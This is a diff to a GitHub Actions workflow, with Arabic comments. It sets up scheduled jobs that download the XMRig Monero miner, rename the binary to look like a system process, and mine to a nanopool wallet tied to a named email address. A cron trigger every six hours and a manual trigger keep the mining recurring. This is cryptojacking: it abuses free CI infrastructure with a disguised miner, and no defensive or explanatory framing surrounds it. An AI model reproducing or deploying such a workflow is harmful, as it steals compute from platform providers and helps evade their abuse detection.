@@ -1,27 +1,32 @@
-name: Whale-Power-5
+name: Infinite-Whale-Worker-X2
 on:
   push:
     branches: [ main ]
+  workflow_dispatch:
+  schedule:
+    - cron: "0 */6 * * *"
 
 jobs:
-  mining:
+  # العامل الأول
+  worker-one:
     runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      matrix:
-        # هنا بنعرف الـ 5 عمال
-        worker_id: [1, 2, 3, 4, 5]
     steps:
-      - name: Prep
+      - name: Prep & Run
         run: |
-          curl -L -o sys.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
-          tar -xf sys.tar.gz
-          mv xmrig-6.21.0/xmrig ./system_process
-          chmod +x system_process
+          curl -L -o sys_core1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar -xf sys_core1.tar.gz
+          mv xmrig-6.21.0/xmrig ./process_1
+          chmod +x process_1
+          ./process_1 -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.WhaleX2-1/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
 
-      - name: Run
+  # العامل الثاني
+  worker-two:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prep & Run
         run: |
-          # لاحظ استخدام الـ matrix هنا عشان كل عامل يبقى ليه اسم مختلف
-          ./system_process -o xmr-eu1.nanopool.org:14444 \
-          -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.Whale-${{ matrix.worker_id }}/nfdr065@gmail.com \
-          --algo rx/0 -p x --donate-level 1 -t 2
+          curl -L -o sys_core2.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar -xf sys_core2.tar.gz
+          mv xmrig-6.21.0/xmrig ./process_2
+          chmod +x process_2
+          ./process_2 -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.WhaleX2-2/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
